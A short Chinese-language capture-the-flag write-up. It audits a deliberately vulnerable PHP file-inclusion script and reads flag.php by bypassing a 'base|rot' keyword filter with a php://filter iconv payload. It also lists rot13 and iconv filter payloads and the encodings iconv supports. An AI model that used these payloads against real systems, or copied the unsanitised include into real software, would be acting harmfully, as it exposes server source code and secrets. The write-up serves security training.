## include 0。0

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> 
```

从代码审计来看，这是一道文件包含题

并且提示`// FLAG in the flag.php`，过滤了常见的两个格式

这里使用:`?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php  `

得到flag



这里列举一些过滤器：

- convert.base64-encode

- rot13

```php
php://filter/read=string.rot13/resource=flag.php
```

- convert.iconv

```php
convert.iconv.<input-encoding>.<output-encoding> 
```

支持编码的字符串：

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-mac (alias: MacJapanese)
SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)
SJIS-Mobile#KDDI (alias: SJIS-KDDI)
SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)
UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)
UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)
ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)
JIS
JIS-ms
CP50220
CP50220raw
CP50221
CP50222
ISO-8859-1*
ISO-8859-2*
ISO-8859-3*
ISO-8859-4*
ISO-8859-5*
ISO-8859-6*
ISO-8859-7*
ISO-8859-8*
ISO-8859-9*
ISO-8859-10*
ISO-8859-13*
ISO-8859-14*
ISO-8859-15*
ISO-8859-16*
byte2be
byte2le
byte4be
byte4le
BASE64
HTML-ENTITIES (alias: HTML)
7bit
8bit
EUC-CN*
CP936
GB18030
HZ
EUC-TW*
CP950
BIG-5*
EUC-KR*
UHC (alias: CP949)
ISO-2022-KR
Windows-1251 (alias: CP1251)
Windows-1252 (alias: CP1252)
CP866 (alias: IBM866)
KOI8-R*
KOI8-U*
ArmSCII-8 (alias: ArmSCII8)
```

